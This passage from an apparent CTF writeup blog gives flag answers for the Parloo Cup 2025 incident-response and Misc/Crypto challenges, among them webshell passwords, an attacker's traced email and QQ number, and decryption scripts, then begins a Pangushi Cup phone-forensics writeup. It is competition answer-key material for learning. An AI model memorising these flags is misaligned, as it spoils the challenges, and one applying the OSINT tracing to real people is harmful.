**提交攻击者使用的攻击ip地址2.<br>**<strong>flag格式为：palu{xxxx}</strong>  </p><p>查看webserver的webdata容器中clean.sh的内容</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747918092130-20c4ecf4-82ce-4d2f-9218-f7411cad8447.png" alt="img"></p><p>palu{192.168.31.11}</p><h2 id="3-1"><a href="#3-1" class="headerlink" title="3"></a>3</h2><p> **题解攻击者暴力破解开始时间。<br>**<strong>flag为:palu{xx:xx:xx:xx}</strong>  </p><p>查看phpmyadmin容器的日志</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747918464671-a26bb021-759a-494a-910f-4a49b243c95b.png" alt="img"></p><p>palu{2025:03:05:58}</p><h2 id="4-1"><a href="#4-1" class="headerlink" title="4"></a>4</h2><p> **提交攻击者留下的flag1<br>**<strong>格式为palu{xxx}</strong>  </p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747958579843-0515e233-e6c7-4dcc-8639-79e0e5d9f99e.png" alt="img"></p><p>palu{pc3_zgsfqwerlkssaw}</p><h2 id="5-1"><a href="#5-1" class="headerlink" title="5"></a>5</h2><p>**提交攻击者留下的flag2<br>**<strong>格式为：palu{xxxx}</strong></p><p>继续翻看上面的flag1，后面执行了一条命令</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747958702021-8d9aec10-8170-4c1c-bcae-cb2a640bb35c.png" alt="img"></p><p>查看a.bat</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747958775899-136c81cc-7ee6-441a-8fcc-6f47e89b1e3a.png" alt="img"></p><p>palu{nizhidaowoyouduoainima}</p><h2 id="6-1"><a href="#6-1" class="headerlink" title="6"></a>6</h2><p> **提交攻击者留下的flag3<br>**<strong>提交格式为：palu{xxxx}</strong>  </p><p>可以在webserver的&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php中找到数据库的密码</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747978699049-a751e4f5-7645-46db-98d4-692d6045ffbc.png" alt="img"></p><p>查看数据库，可以看到content中有很多base64</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747979041500-9bed037d-afd8-4372-b715-b4965e4add0c.png" alt="img"></p><p>其中Mr.chen的content解密即得flag</p><p>palu{sqlaabbccsbwindows}</p><h2 id="7-1"><a href="#7-1" class="headerlink" title="7"></a>7</h2><p> <strong>提交钓鱼文件的哈希32位大写</strong>  </p><p>在回收站中有个简历.zip，拿出来解压计算exe的哈希</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747966813855-a5fcdd48-38c9-421e-9edb-c8c41c2b4cd2.png" alt="img"></p><p>palu{2977CDAB8F3EE5EFDDAE61AD9F6CF203}</p><h2 id="8-1"><a href="#8-1" class="headerlink" title="8"></a>8</h2><p> **提交攻击者留下的webshell-1密码<br>**<strong>格式为：palu{xxxx}</strong>  </p><p>查看webdata容器</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747967200640-7e56633b-69cf-4d65-a97a-c62aae730e48.png" alt="img"></p><p>palu{hack}</p><h2 id="9-1"><a href="#9-1" class="headerlink" title="9*"></a>9*</h2><p> **提交攻击者开放端口<br>**<strong>格式为：palu{xxx,xxx,xxx}</strong>  </p><p>通过第二题中的clean.sh可以看到一个1133端口，以及攻击者使用的ip</p><p>根据其他wp，查看webserver和win10的网络状态还能看到1144和8084端口，但是我并没有找到，可能是我虚拟机启动方式的问题吧（</p><p>palu{1133,1144,8084}</p><h2 id="10-1"><a href="#10-1" class="headerlink" title="10"></a>10</h2><p> **提交攻击者留下的webshell密码2<br>**<strong>格式为：palu{xxxx}</strong>  </p><p>在webserver的&#x2F;var&#x2F;www&#x2F;html下也有马</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747983382520-a51972cd-d4c8-49d8-bf35-ef16c881260c.png" alt="img"></p><p>palu{00232}</p><h2 id="11-1"><a href="#11-1" class="headerlink" title="11"></a>11</h2><p>**提交攻击者留下的隐藏账户的密码<br>**<strong>flag格式为：palu{xxxx}</strong></p><p>取证大师一把梭</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747984248969-c9f684cf-3097-4f88-9c4e-36886fe8b9c9.png" alt="img"></p><p>palu{wmx_love}</p><h2 id="12-1"><a href="#12-1" class="headerlink" title="12"></a>12</h2><p>**[溯源]攻击者的邮箱.<br>**<strong>flag格式为：palu{xxx}</strong></p><p>逆向之前的简历.exe</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747984704317-a24de27e-3322-4091-be3f-d4406bae9c78.png" alt="img"></p><p>可以看到n0k4u这个人，去github上能找到他的账号</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747984814538-79ae717c-4f09-4e83-9b81-761379a5da94.png" alt="img"></p><p>通过api溯源到这个注册账号的邮箱</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747984950644-1d04f049-56d6-4a91-adb4-432cfa68ef3f.png" alt="img"></p><p>palu{<a href="mailto:&#x6e;&#x30;&#107;&#52;&#x75;&#x40;&#x6f;&#117;&#116;&#x6c;&#111;&#111;&#x6b;&#x2e;&#99;&#x6f;&#109;">&#x6e;&#x30;&#107;&#52;&#x75;&#x40;&#x6f;&#117;&#116;&#x6c;&#111;&#111;&#x6b;&#x2e;&#99;&#x6f;&#109;</a>}</p><h2 id="13-1"><a href="#13-1" class="headerlink" title="13"></a>13</h2><p> **提交溯源后得到的flag<br>**<strong>flag格式为：palu{xxx}</strong>  </p><p>上体找到的github账户唯一的repo内容如下</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747985161025-31118d12-fc3b-4293-b0d2-6a8dd562b467.png" alt="img"></p><p>这个密语其实是个qq号，尝试添加好友就能看到flag</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747985411645-e7006085-a7a9-4e6b-a30f-f76ac4de803f.png" alt="img"></p><p>palu{loveyouibiejv}</p><h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><blockquote><p>再记录几道当时我做的CTF部分的题目吧 :)</p></blockquote><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="screenshot"><a href="#screenshot" class="headerlink" title="screenshot"></a>screenshot</h3><p> 有个笨比截图flag的时候不小心发到群里了,细心和反回撤的群友已经偷偷记录下来了  </p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747441927162-2dc02001-6c91-4363-8c50-8691a2804a1c.png" alt="img"></p><h3 id="时间折叠（TimeFold-Paradox）"><a href="#时间折叠（TimeFold-Paradox）" class="headerlink" title="时间折叠（TimeFold Paradox）"></a>时间折叠（TimeFold Paradox）</h3><p>题目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">[1970-01-01 08:00:00] System boot sequence initiated</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 00000000fe ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 10000000ef ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 20000000e2 ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 30000000fb ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 40000000f5 ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 50000000da ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 60000000e6 ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 70000000e7 ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 80000000fd ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 90000000d1 ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 100000000e7 ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 110000000fd ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 120000000d1 ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 130000000cf ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 140000000d1 ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 150000000dd ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 160000000ef ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 170000000e3 ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 180000000fe ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 190000000e2 ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 200000000eb ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 210000000d1 ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 220000000c8 ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 230000000e2 ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 240000000ef ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 250000000e9 ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 260000000d1 ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 270000000cd ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 280000000e6 ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 290000000ef ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 300000000e0 ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 310000000e9 ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 320000000eb ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 330000000d1 ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 340000000c3 ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 350000000eb ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 360000000af ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 370000000af ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 380000000f3 ns</span><br><span class="line">[1970-01-01 08:00:00] System entering chronostasis mode</span><br></pre></td></tr></table></figure><p>将每一个十六进制数的末两位提取出来然后xor brute force</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747444673031-4df10be4-0a4d-4f2f-8676-5621315f77a2.png" alt="img"></p><h3 id="时空交织的密语"><a href="#时空交织的密语" class="headerlink" title="时空交织的密语"></a>时空交织的密语</h3><p>将二进制fromhex以后可以发现每四个字节是一组，而且前28位完全相同因此提取出每组的最低四位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;timestream.bin&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">s=f.read()</span><br><span class="line">x=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="built_in">len</span>(s),<span class="number">4</span>):</span><br><span class="line">    x+=<span class="built_in">str</span>(<span class="built_in">hex</span>(s[i]%<span class="number">16</span>)[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure><p>发现将第一个数字删去以后fromhex就能得到flag</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747483643243-f804d7d3-a4bf-4f50-a3dd-da7c1ca8d41b.png" alt="img"></p><h3 id="几何闪烁的秘密"><a href="#几何闪烁的秘密" class="headerlink" title="几何闪烁的秘密"></a>几何闪烁的秘密</h3><p>稍微把有字的帧分离一下，每一个图形内出现过的字是一段，每段出现三遍，但是每遍都会缺几个字符，把三遍结合起来看，最后把四段拼起来解base64就行</p><p>palu{master_of_geometry}</p><h3 id="时间循环的信使"><a href="#时间循环的信使" class="headerlink" title="时间循环的信使"></a>时间循环的信使</h3><p>按照时间戳排序，如果|后面的字符都是一样的就提取出来，拼起来后fromhex</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;timeloop.log&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        stripped = line.strip()</span><br><span class="line">        <span class="keyword">if</span> stripped:</span><br><span class="line">            parts = stripped.split(<span class="string">&quot;|&quot;</span>)</span><br><span class="line">            data.append(parts)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i + <span class="number">1</span>, <span class="built_in">len</span>(data)):</span><br><span class="line">        <span class="keyword">if</span> data[i][<span class="number">0</span>] &gt; data[j][<span class="number">0</span>]:</span><br><span class="line">            data[i], data[j] = data[j], data[i]</span><br><span class="line">res_str = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> data:</span><br><span class="line">    second_field = item[<span class="number">1</span>]</span><br><span class="line">    first_char = second_field[<span class="number">0</span>]</span><br><span class="line">    all_same = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> second_field:</span><br><span class="line">        <span class="keyword">if</span> ch != first_char:</span><br><span class="line">            all_same = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> all_same:</span><br><span class="line">        res_str += first_char</span><br><span class="line">hex_num = <span class="built_in">int</span>(res_str, <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(hex_num))</span><br><span class="line"><span class="comment">#b&#x27;palu&#123;Time_1s_cycl1c@l_0x&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="循环锁链"><a href="#循环锁链" class="headerlink" title="循环锁链"></a>循环锁链</h3><p>flag的下一位是前一位xor的密钥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;flag.enc&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">s=f.read()</span><br><span class="line">tmp=<span class="number">112</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)-<span class="number">1</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(s[i]^tmp)</span><br><span class="line">    tmp=s[i]^tmp</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p&#x27;</span>+flag[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><h3 id="轮回密码"><a href="#轮回密码" class="headerlink" title="轮回密码"></a>轮回密码</h3><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">samsara_encrypt</span>(<span class="params">text, key_word</span>):</span><br><span class="line">    cycle_step = <span class="built_in">len</span>(key_word) % <span class="number">6</span> + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    phase1 = <span class="built_in">bytes</span>([(c &gt;&gt; cycle_step) | ((c &lt;&lt; (<span class="number">8</span> - cycle_step)) &amp; <span class="number">0xFF</span>) <span class="keyword">for</span> c <span class="keyword">in</span> text])</span><br><span class="line"></span><br><span class="line">    phase2 = base64.b85encode(phase1)</span><br><span class="line"></span><br><span class="line">    phase3 = <span class="built_in">bytes</span>([(c &gt;&gt; cycle_step) | ((c &lt;&lt; (<span class="number">8</span> - cycle_step)) &amp; <span class="number">0xFF</span>) <span class="keyword">for</span> c <span class="keyword">in</span> phase2])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([phase3[i] ^ key_word[i % <span class="built_in">len</span>(key_word)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(phase3))])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    flag = <span class="string">b&quot;palu&#123;********&#125;&quot;</span> </span><br><span class="line">    key = <span class="string">b&quot;&quot;</span></span><br><span class="line">    cipher = samsara_encrypt(flag, key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;轮回密文:&quot;</span>, cipher.decode(<span class="string">&#x27;latin-1&#x27;</span>))</span><br></pre></td></tr></table></figure><p>轮换加密，照着逻辑换回去就行</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">cipher_text = <span class="string">&#x27;y¦_6&gt;X¬y!,!n¡mSaÜñüë9¼6&#x27;</span>.encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">key=<span class="string">b&#x27;Bore&#x27;</span></span><br><span class="line">cycle_step = <span class="built_in">len</span>(key) % <span class="number">6</span> + <span class="number">1</span></span><br><span class="line">phase3=<span class="built_in">bytes</span>([cipher_text[i] ^ key[i % <span class="built_in">len</span>(key)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher_text))])</span><br><span class="line">phase2=<span class="built_in">bytes</span>([ ((c &gt;&gt; (<span class="number">8</span> - cycle_step))|(c &lt;&lt; cycle_step)  &amp; <span class="number">0xFF</span>) <span class="keyword">for</span> c <span class="keyword">in</span> phase3])</span><br><span class="line">phase1=base64.b85decode(phase2)</span><br><span class="line">flag=<span class="built_in">bytes</span>([(c &gt;&gt; (<span class="number">8</span> - cycle_step) | ((c &lt;&lt; cycle_step)) &amp; <span class="number">0xFF</span>) <span class="keyword">for</span> c <span class="keyword">in</span> phase1])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#b&#x27;palu&#123;reincarnation_cipher&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="RSA-Quartic-Quandary"><a href="#RSA-Quartic-Quandary" class="headerlink" title="RSA_Quartic_Quandary"></a>RSA_Quartic_Quandary</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy <span class="keyword">as</span> sp</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_p_q</span>(<span class="params">pq, p4_plus_q4</span>):</span><br><span class="line">    x, y = sp.symbols(<span class="string">&#x27;x y&#x27;</span>)</span><br><span class="line">    eq = (x**<span class="number">2</span> - <span class="number">2</span> * y)**<span class="number">2</span> - <span class="number">2</span> * y**<span class="number">2</span> - p4_plus_q4</span><br><span class="line">    solutions_for_x = sp.solve(eq.subs(y, pq), x)</span><br><span class="line">    results = []</span><br><span class="line">    <span class="keyword">for</span> x_sol <span class="keyword">in</span> solutions_for_x:</span><br><span class="line">        t = sp.symbols(<span class="string">&#x27;t&#x27;</span>)</span><br><span class="line">        quadratic_eq = t**<span class="number">2</span> - x_sol * t + pq</span><br><span class="line">        roots = sp.solve(quadratic_eq, t)</span><br><span class="line">        results.append(roots)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> results</span><br><span class="line">n = <span class="number">125997816345753096048865891139073286898143461169514858050232837657906289840897974068391106608902082960171083817785532702158298589600947834699494234633846206712414663927142998976208173208829799860130354978308649020815886262453865196867390105038666506017720712272359417586671917060323891124382072599746305448903</span></span><br><span class="line">s = <span class="number">35935569267272146368441512592153486419244649035623643902985220815940198358146024590300394059909370115858091217597774010493938674472746828352595432824315405933241792789402041405932624651226442192749572918686958461029988244396875361295785103356745756304497466567342796329331150560777052588294638069488836419744297241409127729615544668547101580333420563318486256358906310909703237944327684178950282413703357020770127158209107658407007489563388980582632159120621869165333921661377997970334407786581024278698231418756106787058054355713472306409772260619117725561889350862414726861327985706773512963177174611689685575805282</span></span><br><span class="line">solutions = solve_p_q(n, s)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">16076213508704830809521504161524867240789661063230251272973700316524961511842110066547743812160813341691286895800830395413052502516451815705610447484880112548934311914559776633140762863945819054432492392315491109745915225117227073045171062365772401296382778452901831550773993089344837645958797206220200272941</span></span><br><span class="line"><span class="keyword">for</span> i, sol <span class="keyword">in</span> <span class="built_in">enumerate</span>(solutions):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(sol[<span class="number">0</span>])&gt;<span class="number">0</span> <span class="keyword">and</span> <span class="built_in">int</span>(sol[<span class="number">1</span>])&gt;<span class="number">0</span>:</span><br><span class="line">        p = <span class="built_in">int</span>(sol[<span class="number">0</span>])</span><br><span class="line">        q = <span class="built_in">int</span>(sol[<span class="number">1</span>])</span><br><span class="line">        d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">        m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment">#b&#x27;palu&#123;This_is_a_fake_flag_change_it_for_real_use&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> Parloo杯 </tag>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>盘古石杯2025初赛 Writeup+复现（断更中）</title>
      <link href="/posts/56d4296b/"/>
      <url>/posts/56d4296b/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这次混了个预赛二等奖，但同样未能成功晋级，菜炸了（（<br>唉好好复现学习一下吧<br>以下是在w8nn9z、1n1t两位爷的帮助下一起尝试完成的复现Orz</p></blockquote><blockquote><p>服务器取证部分复现起来有点耗时耗力，暂时先搁置了。。。也许等下一次打取证比赛前会想起更新吧（）</p><p>数据取证部分在网上没找到标准答案，就不复现了。</p></blockquote><h2 id="手机取证"><a href="#手机取证" class="headerlink" title="手机取证"></a>手机取证</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p><strong>分析安卓手机检材，手机的IMSI是？</strong></p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747143336775-d036b3a8-4148-48e5-bd17-e83df98629fb.png" alt="img"></p><p>460036641292715</p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p><strong>养鱼诈骗投资1000，五天后收益是？</strong></p><p>在QQ聊天记录里可以找到</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747143522201-4f663577-dfd6-4982-8908-353bd355dab9.png" alt="img"></p><p>175</p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p><strong>分析苹果手机检材，手机的IDFA是？</strong></p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747144195467-024cb18f-11de-49a4-8712-b9832db8c265.png" alt="img"></p><p>E477D4C7-BD02-4979-BC9D-5C5DE7BD1F17</p><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p><strong>Telegram应用的卸载时间是？</strong></p><p>过滤卸载记录</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747144435931-9ed3c23b-b7e9-4bd2-af9e-16b34a968192.png" alt="img"></p><p>2025-04-17-10:51:39</p><h3 id="5"><a href="#5" class="headerlink" 